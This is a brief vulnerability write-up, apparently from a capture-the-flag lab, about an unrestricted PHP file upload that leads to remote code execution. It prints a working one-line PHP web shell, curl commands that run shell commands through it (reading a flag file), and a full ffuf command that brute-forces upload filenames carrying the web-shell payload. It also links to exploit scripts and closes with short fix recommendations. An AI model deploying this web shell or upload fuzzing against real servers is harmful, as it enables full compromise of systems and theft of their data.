üìú Vulnerability Report Summary
Title: Unrestricted File Upload ‚Üí Remote Code Execution (RCE)
Target: http://REDACTED/upload.php
Severity: Critical (CVSS: 9.8)

üîç Findings
Vulnerability:

The server allowed uploading .phar/.phtml files with embedded PHP code.

Bypassed filters using :: (NTFS Alternate Data Stream) to hide .jpg extension.

Exploit:

Uploaded a fake image (REDACTED) containing PHP code:

php
<?php system($_GET["cmd"]); ?>
Executed commands via:

bash
curl "http://target/profile_images?REDACTDcmd=id"
Impact:

Full server compromise (read /flag.txt, execute arbitrary commands).

Potential privilege escalation (if running as root).

üõ†Ô∏è Fix Recommendations
File Upload Validation:

php
$allowed = ['jpg', 'png'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) { die("Only images allowed!"); }
Disable Dangerous Executables (in Apache/Nginx):

nginx
location ~ \.(REDACTEDl)$ { deny all; }
Use Random Filenames (e.g., UUID.jpg) to prevent direct access.

üîé Evidence
Command Execution:

bash
$ curl "http://REDACTED/REDACTED?cmd=cat+/REDACTED.FILE"
FLAG{EXAMPLE_FLAG}

Exploit Scripts: https://github.com/Devjustice/whitelist_fileupload/tree/main


‚îÄ$ ffuf -w wordlist.txt:FUZZ \
     -X POST \
     -u http://redacted/upload.php \
     -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitUbq2yCeq0Acg5S' \
     -b "PHPSESSID=YOUR_SESSION" \
     --data-binary $'------WebKitFormBoundaryitUbq2yCeq0Acg5S\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryitUbq2yCeq0Acg5S--\r\n' \
     -mr "File successfully uploaded" \
     -fr "Only images are allowed" \
     -t 20 \
     -rate 10 \
     -o upload_results.json


